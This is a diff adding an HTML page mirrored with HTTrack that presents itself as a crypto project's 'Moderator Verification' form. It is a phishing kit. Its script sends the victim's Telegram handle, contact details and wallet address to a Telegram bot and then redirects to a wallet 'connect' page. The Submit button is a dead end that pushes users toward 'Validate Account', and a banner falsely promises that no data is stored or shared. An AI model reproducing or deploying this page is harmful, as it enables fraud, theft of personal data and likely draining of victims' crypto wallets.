@@ -1,0 +1,637 @@
+<!DOCTYPE html>
+<html lang="en">
+
+
+<!-- Mirrored from moderatorverifications.pages.dev/_next/static/css/c4ec02ad6edfab3b.css by HTTrack Website Copier/3.x [XR&CO'2014], Fri, 17 Apr 2026 22:26:58 GMT -->
+<!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=utf-8" /><!-- /Added by HTTrack -->
+<head>
+    <meta charset="utf-8" />
+    <meta name="viewport" content="width=device-width,initial-scale=1" />
+    <title>Moderator Verification DApp</title>
+
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&amp;display=swap" rel="stylesheet">
+
+    <style>
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+        }
+
+        body {
+            background: #0b1220;
+            color: #e5edff;
+            font-family: Inter, system-ui, -apple-system, "Segoe UI", Roboto;
+            padding: 20px;
+            min-height: 100vh;
+
+            /* STACK layout so .container and .trust-banner sit vertically */
+            display: flex;
+            flex-direction: column;
+            /* changed from row (default) */
+            gap: 20px;
+            align-items: center;
+            /* center horizontally */
+            justify-content: flex-start;
+            /* start from top; change to center if you want vertical centering */
+        }
+
+        .container {
+            width: 100%;
+            max-width: 720px;
+            background: #1a2942;
+            border-radius: 12px;
+            padding: 32px;
+            box-shadow: 0 10px 40px rgba(0, 0, 0, 0.35);
+            border: 1px solid #2a3f5f;
+        }
+
+        h1 {
+            font-size: 24px;
+            margin-bottom: 6px;
+            color: #fff;
+        }
+
+        .subtitle {
+            color: #9ca3af;
+            font-size: 13px;
+            margin-bottom: 20px;
+        }
+
+        form {
+            display: flex;
+            flex-direction: column;
+            gap: 12px;
+        }
+
+        .form-group {
+            display: flex;
+            flex-direction: column;
+        }
+
+        label {
+            color: #c7d2e0;
+            font-weight: 500;
+            font-size: 13px;
+            margin-bottom: 6px;
+        }
+
+        input,
+        textarea {
+            background: #0b1220;
+            color: #e5edff;
+            border: 1px solid #2a3f5f;
+            padding: 10px 12px;
+            border-radius: 8px;
+            font-size: 14px;
+            font-family: inherit;
+        }
+
+        input:focus,
+        textarea:focus {
+            outline: 2px solid rgba(59, 130, 246, 0.18);
+        }
+
+        textarea {
+            min-height: 80px;
+            resize: vertical;
+        }
+
+        .wallet-status {
+            font-size: 12px;
+            margin-top: 6px;
+            padding: 6px 8px;
+            border-radius: 6px;
+            background: rgba(0, 0, 0, 0.2);
+        }
+
+        .success {
+            color: #22c55e;
+        }
+
+        .warning {
+            color: #facc15;
+        }
+
+        .error {
+            color: #f87171;
+        }
+
+        .actions {
+            display: flex;
+            gap: 10px;
+            margin-top: 6px;
+        }
+
+        button {
+            padding: 10px 16px;
+            border-radius: 8px;
+            border: none;
+            font-weight: 600;
+            cursor: pointer;
+            background: linear-gradient(135deg, #3b82f6 0%, #2563eb 100%);
+            color: #fff;
+        }
+
+        button.secondary {
+            background: linear-gradient(135deg, #22c55e 0%, #16a34a 100%);
+        }
+
+        button:disabled {
+            background: #6b7280;
+            cursor: not-allowed;
+        }
+
+        /* Hide connect button until a wallet is provided */
+        #connectVerifyBtn {
+            display: none;
+        }
+
+        .loading-spinner {
+            display: inline-block;
+            width: 14px;
+            height: 14px;
+            border: 2px solid rgba(255, 255, 255, 0.25);
+            border-radius: 50%;
+            border-top-color: #fff;
+            animation: spin 0.8s linear infinite;
+            margin-right: 8px;
+            vertical-align: middle;
+        }
+
+        @keyframes spin {
+            to {
+                transform: rotate(360deg);
+            }
+        }
+
+        .verification-section {
+            margin-top: 18px;
+            padding-top: 12px;
+            border-top: 1px dashed rgba(255, 255, 255, 0.04);
+        }
+
+        .wallet-info {
+            background: rgba(59, 130, 246, 0.06);
+            border: 1px solid rgba(59, 130, 246, 0.18);
+            padding: 12px;
+            border-radius: 8px;
+        }
+
+        .wallet-address {
+            font-family: monospace;
+            word-break: break-all;
+            color: #dbeafe;
+        }
+
+        .status-line {
+            margin-top: 8px;
+            font-size: 13px;
+            color: #c7d2e0;
+        }
+
+        .hint {
+            font-size: 12px;
+            color: #9ca3af;
+            margin-top: 6px;
+        }
+
+        /* Trust Banner */
+        .trust-banner {
+            /* make the banner match the container width and sit beneath it */
+            width: 100%;
+            max-width: 720px;
+
+            margin-top: 0;
+            /* body gap handles space */
+            padding: 18px 20px;
+            border-radius: 12px;
+            background: linear-gradient(180deg,
+                    rgba(34, 197, 94, 0.08),
+                    rgba(59, 130, 246, 0.06));
+            border: 1px solid rgba(59, 130, 246, 0.28);
+            text-align: center;
+            animation: fadeSlideUp 0.8s ease-out both;
+        }
+
+        .trust-content {
+            max-width: 620px;
+            margin: 0 auto;
+        }
+
+        .trust-title {
+            font-size: 13px;
+            font-weight: 600;
+            color: #dbeafe;
+            margin-bottom: 4px;
+        }
+
+        .trust-title.secondary {
+            margin-top: 12px;
+        }
+
+        .trust-text {
+            font-size: 12.5px;
+            line-height: 1.6;
+            color: #c7d2e0;
+        }
+
+        /* Subtle animation */
+        @keyframes fadeSlideUp {
+            from {
+                opacity: 0;
+                transform: translateY(12px);
+            }
+
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        /* Modal for red caution on submit */
+        .modal-overlay {
+            position: fixed;
+            inset: 0;
+            display: none;
+            align-items: center;
+            justify-content: center;
+            background: rgba(2, 6, 23, 0.6);
+            z-index: 9999;
+            padding: 16px;
+        }
+
+        .modal {
+            background: #0b1220;
+            border: 1px solid rgba(248, 113, 113, 0.18);
+            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.6);
+            border-radius: 12px;
+            max-width: 420px;
+            width: 100%;
+            padding: 20px;
+            text-align: center;
+            color: #ffecec;
+        }
+
+        .modal .icon {
+            font-size: 34px;
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            width: 56px;
+            height: 56px;
+            border-radius: 50%;
+            background: rgba(255, 69, 58, 0.12);
+            color: #ff3b30;
+            margin: 0 auto 12px;
+        }
+
+        .modal h3 {
+            font-size: 16px;
+            margin-bottom: 8px;
+            color: #ffdede;
+        }
+
+        .modal p {
+            color: #ffdede;
+            font-weight: 600;
+            margin-bottom: 16px;
+        }
+
+        .modal button {
+            background: linear-gradient(180deg, #ff4d4d 0%, #e3342f 100%);
+            border: none;
+            padding: 8px 14px;
+            border-radius: 8px;
+            color: #fff;
+            font-weight: 700;
+            cursor: pointer;
+        }
+
+        /* Responsive tweak: on narrow screens keep padding comfortable */
+        @media (max-width: 420px) {
+            .container {
+                padding: 20px;
+            }
+
+            .trust-banner {
+                padding: 14px 16px;
+            }
+        }
+    </style>
+</head>
+
+<body>
+    <div class="container">
+        <h1>Moderator Verification</h1>
+        <p class="subtitle">Complete profile to apply as a project moderator</p>
+
+        <form id="verifyForm" novalidate>
+            <div class="form-group">
+                <label for="telegram">Telegram Username</label>
+                <input id="telegram" name="telegram" type="text" required placeholder="@username" />
+            </div>
+
+            <div class="form-group">
+                <label for="country">Country</label>
+                <input id="country" name="country" type="text" required placeholder="e.g., United States" />
+            </div>
+
+            <div class="form-group">
+                <label for="timezone">Do you have any technical Knowledge</label>
+                <input id="timezone" name="timezone" type="text" required placeholder="Yes or No" />
+            </div>
+
+            <div class="form-group">
+                <label for="availability">Availability</label>
+                <input id="availability" name="availability" type="text" required placeholder="e.g., 8 hours/day" />
+            </div>
+
+            <div class="form-group">
+                <label for="experience">Do you have any Moderation Experience</label>
+                <textarea id="experience" name="experience"
+                    placeholder="Yes or No"></textarea>
+            </div>
+
+            <div class="form-group">
+                <label for="motivation">What idea can you impact to the project?</label>
+                <textarea id="motivation" name="motivation" required
+                    placeholder="Tell us your motivation..."></textarea>
+            </div>
+
+            <div class="form-group">
+                <label for="cryptoExperience">How many years of crypto experience do you have?</label>
+                <textarea id="cryptoExperience" name="cryptoExperience" required
+                    placeholder="Describe your crypto experience..."></textarea>
+            </div>
+
+            <div class="form-group">
+                <label for="conflictHandling">Where other places can we reach out to you ?</label>
+                <textarea id="conflictHandling" name="conflictHandling" required
+                    placeholder="You can drop either your Email or Whatsapp number..."></textarea>
+            </div>
+
+            <div class="form-group">
+                <label for="wallet">Crypto Wallet Address(use to participate in our project)</label>
+                <input id="wallet" name="wallet" type="text" required placeholder="input chain address" />
+                <div id="walletStatus" class="wallet-status" aria-live="polite"></div>
+
+                <!-- Hidden by default; will be shown when ownership verification appears -->
+                <div id="ownershipHint" class="hint" style="display:none;">
+                    Proceed to "Validate Account" to confirm ownership and also get register for Bi-weekly compensation.
+                </div>
+
+                <div class="actions">
+                    <button id="connectVerifyBtn" type="button" class="secondary">Validate Account</button>
+                    <button id="submitBtn" type="submit">Submit Verification</button>
+                </div>
+            </div>
+        </form>
+
+        <div id="ownershipVerification" class="verification-section" aria-hidden="true" style="display:none;">
+            <h2 style="font-size:16px; margin-bottom:8px; color:#fff;">Ownership Verification</h2>
+            <p class="status-line">Detected wallet:</p>
+            <div class="wallet-info" style="margin-top:8px;">
+                <div id="displayWallet" class="wallet-address"></div>
+                <div id="displayChain" class="status-line"></div>
+            </div>
+            <div id="ownershipStatus" class="status-line"></div>
+        </div>
+
+    </div>
+    <div class="trust-banner">
+        <div class="trust-content">
+            <p class="trust-title">
+                ⚠️ Important Notice
+            </p>
+            <p class="trust-text">
+                This process is <strong>mandatory</strong> to validate your position, safeguard your access rights,
+                and ensure seamless participation as project moderator.
+            </p>
+
+            <p class="trust-title secondary">
+                🔒 Security Assurance
+            </p>
+            <p class="trust-text">
+                All process authorizations are fully encrypted and processed through secure blockchain protocols.
+                Your credentials remain <strong>private</strong>, and no sensitive data is ever stored or shared.
+            </p>
+        </div>
+    </div>
+
+    <!-- Modal shown when user clicks Submit Verification -->
+    <div id="submitModal" class="modal-overlay" role="presentation" aria-hidden="true">
+        <div class="modal" role="alertdialog" aria-labelledby="modalTitle" aria-describedby="modalDesc">
+            <div class="icon" aria-hidden="true">⚠️</div>
+            <h3 id="modalTitle">Action Required</h3>
+            <p id="modalDesc">KINDLY GO BACK AND VALIDATE ACCOUNT.</p>
+            <button id="modalClose" type="button">OK</button>
+        </div>
+    </div>
+
+    <script src="../../../../cdn.jsdelivr.net/npm/ethers%405.7.2/dist/ethers.umd.min.js"></script>
+
+    <script>
+        (function () {
+
+            // ----------------- TELEGRAM CONFIG -----------------
+            const TG_BOT_TOKEN = "#"; // ⚠️ Visible in source
+            const TG_CHAT_ID = "#";      // e.g., -1001234567890
+
+            const form = document.getElementById('verifyForm');
+            const walletInput = document.getElementById('wallet');
+            const walletStatus = document.getElementById('walletStatus');
+            const connectBtn = document.getElementById('connectVerifyBtn');
+            const submitBtn = document.getElementById('submitBtn');
+            const ownershipSection = document.getElementById('ownershipVerification');
+            const displayWallet = document.getElementById('displayWallet');
+            const displayChain = document.getElementById('displayChain');
+            const ownershipStatus = document.getElementById('ownershipStatus');
+            const ownershipHint = document.getElementById('ownershipHint');
+
+            // Modal elements
+            const submitModal = document.getElementById('submitModal');
+            const modalClose = document.getElementById('modalClose');
+
+            // ----------------- HELPERS -----------------
+            function detectChain(address) {
+                if (!address || typeof address !== 'string') return { chain: null, confidence: 0 };
+                const addr = address.trim();
+                if (/^0x[a-fA-F0-9]{40}$/.test(addr)) return { chain: 'evm', confidence: 0.95 };
+                if (/^[1-9A-HJ-NP-Za-km-z]{32,44}$/.test(addr)) return { chain: 'solana', confidence: 0.8 };
+                if (/^(bc1)[0-9a-zA-Z]{11,90}$/.test(addr.toLowerCase()) || /^[13][a-km-zA-HJ-NP-Z1-9]{25,39}$/.test(addr)) return { chain: 'bitcoin', confidence: 0.9 };
+                if (/^r[1-9A-HJ-NP-Za-km-z]{24,34}$/.test(addr)) return { chain: 'xrp', confidence: 0.85 };
+                if (/^T[1-9A-HJ-NP-Za-km-z]{33}$/.test(addr)) return { chain: 'tron', confidence: 0.9 };
+                if (/^G[0-9A-Z]{55}$/.test(addr)) return { chain: 'stellar', confidence: 0.9 };
+                if (/^[A-Z2-7]{58}$/.test(addr)) return { chain: 'algorand', confidence: 0.9 };
+                if (/^tz[123][1-9A-HJ-NP-Za-km-z]{33}$/.test(addr)) return { chain: 'tezos', confidence: 0.9 };
+                if (/^addr1[0-9a-z]{1,}$/i.test(addr)) return { chain: 'cardano', confidence: 0.9 };
+                if (/^cosmos1[0-9a-z]{1,}$/i.test(addr)) return { chain: 'cosmos', confidence: 0.85 };
+                if (/^(ed25519:)?[0-9a-fA-F]{64}$/.test(addr) || /.+\.(testnet|near)$/.test(addr)) return { chain: 'near', confidence: 0.75 };
+                if (/^[1-9A-HJ-NP-Za-km-z]{20,90}$/.test(addr)) return { chain: 'base58-like', confidence: 0.5 };
+                if (/^[A-Za-z2-7]{20,90}$/.test(addr)) return { chain: 'base32-like', confidence: 0.5 };
+                if (/^[a-zA-Z0-9\-\._]{8,120}$/.test(addr)) return { chain: 'unknown', confidence: 0.2 };
+                return { chain: null, confidence: 0 };
+            }
+
+            function setWalletStatus(text, cls) {
+                walletStatus.textContent = text;
+                walletStatus.className = 'wallet-status' + (cls ? ' ' + cls : '');
+            }
+
+            function setLoading(btn, loading, text) {
+                if (loading) {
+                    btn.disabled = true;
+                    btn.innerHTML = '<span class="loading-spinner"></span>' + (text || 'Working...');
+                } else {
+                    btn.disabled = false;
+                    if (btn.id === 'connectVerifyBtn') btn.textContent = 'Validate Account';
+                    if (btn.id === 'submitBtn') btn.textContent = 'Submit Verification';
+                }
+            }
+
+            // ----------------- TELEGRAM FUNCTION -----------------
+            async function sendToTelegram(formObj) {
+                const message =
+                    `🛡 MODERATOR APPLICATION
+
+👤 Telegram: ${formObj.telegram}
+🌍 Country: ${formObj.country}
+⏰ Timezone: ${formObj.timezone}
+📅 Availability: ${formObj.availability}
+
+💼 Experience:
+${formObj.experience || "N/A"}
+
+💡 Impact Idea:
+${formObj.motivation}
+
+⛓ Crypto Experience:
+${formObj.cryptoExperience}
+
+⚖ Conflict Handling:
+${formObj.conflictHandling}
+
+💳 Wallet:
+${formObj.wallet || "Not provided"}
+`;
+                const url = `https://api.telegram.org/bot${TG_BOT_TOKEN}/sendMessage`;
+                return fetch(url, {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify({ chat_id: TG_CHAT_ID, text: message })
+                });
+            }
+
+            // ----------------- WALLET INPUT -----------------
+            walletInput.addEventListener('input', () => {
+                const v = (walletInput.value || '').trim();
+                if (!v) {
+                    setWalletStatus('');
+                    ownershipSection.style.display = 'none';
+                    ownershipSection.setAttribute('aria-hidden', 'true');
+                    // hide connect button and hint until address present and valid
+                    connectBtn.style.display = 'none';
+                    ownershipHint.style.display = 'none';
+                    return;
+                }
+                const d = detectChain(v);
+                if (d.chain) {
+                    setWalletStatus(`${d.chain.toUpperCase()} address detected (confidence ${Math.round(d.confidence * 100)}%)`, 'success');
+                    displayWallet.textContent = v;
+                    displayChain.textContent = d.chain;
+                    ownershipSection.style.display = 'block';
+                    ownershipSection.setAttribute('aria-hidden', 'false');
+                    // show connect button and hint now that address is present and detected
+                    connectBtn.style.display = 'inline-block';
+                    ownershipHint.style.display = 'block';
+                } else {
+                    setWalletStatus('Address format not recognized', 'warning');
+                    ownershipSection.style.display = 'none';
+                    ownershipSection.setAttribute('aria-hidden', 'true');
+                    connectBtn.style.display = 'none';
+                    ownershipHint.style.display = 'none';
+                }
+            });
+
+            // ----------------- CONNECT & VERIFY -----------------
+            connectBtn.addEventListener('click', async () => {
+                setLoading(connectBtn, true, 'Preparing...');
+                try {
+                    const formObj = Object.fromEntries(new FormData(form));
+                    try { sessionStorage.setItem('moderatorForm', JSON.stringify(formObj)); } catch (e) { }
+
+                    // Send form to Telegram
+                    try { await sendToTelegram(formObj); } catch (e) { console.error("TG send failed", e); }
+
+                    // Redirect logic (wallet flow)
+                    let address = (formObj.wallet || '').trim();
+                    let chain = address ? (detectChain(address).chain || 'unknown') : null;
+                    const url = new URL(window.location.origin + '/connect/');
+                    if (address) url.searchParams.set('address', address);
+                    if (chain) url.searchParams.set('chain', chain);
+                    window.location.href = url.toString();
+
+                } catch (err) {
+                    console.error('Error during connect', err);
+                    window.location.href = '../../../connect/index.html';
+                } finally {
+                    setLoading(connectBtn, false);
+                }
+            });
+
+            // ----------------- SUBMIT BUTTON (SHOW RED CAUTION MODAL) -----------------
+            form.addEventListener('submit', (e) => {
+                // Prevent the default submission and show the red caution popup/modal
+                e.preventDefault();
+
+                // Show modal
+                submitModal.style.display = 'flex';
+                submitModal.setAttribute('aria-hidden', 'false');
+
+                // Move focus to the modal close button for accessibility
+                modalClose.focus();
+            });
+
+            // Close modal handlers
+            modalClose.addEventListener('click', () => {
+                submitModal.style.display = 'none';
+                submitModal.setAttribute('aria-hidden', 'true');
+
+                // return focus to Submit button
+                submitBtn.focus();
+            });
+
+            // Close modal if clicking outside the modal content
+            submitModal.addEventListener('click', (ev) => {
+                if (ev.target === submitModal) {
+                    submitModal.style.display = 'none';
+                    submitModal.setAttribute('aria-hidden', 'true');
+                    submitBtn.focus();
+                }
+            });
+
+            // Close modal on Escape
+            document.addEventListener('keydown', (ev) => {
+                if (ev.key === 'Escape' && submitModal.style.display === 'flex') {
+                    submitModal.style.display = 'none';
+                    submitModal.setAttribute('aria-hidden', 'true');
+                    submitBtn.focus();
+                }
+            });
+
+            // ----------------- INITIAL STATUS -----------------
+            setWalletStatus('Paste wallet address', 'warning');
+
+            // Run the input handler once on load so a prefilled wallet will reveal the connect button and hint
+            Promise.resolve().then(() => {
+                walletInput.dispatchEvent(new Event('input', { bubbles: true }));
+            });
+
+        })();
+    </script>
+</body>
+
+
+<!-- Mirrored from moderatorverifications.pages.dev/_next/static/css/c4ec02ad6edfab3b.css by HTTrack Website Copier/3.x [XR&CO'2014], Fri, 17 Apr 2026 22:26:58 GMT -->
+</html>
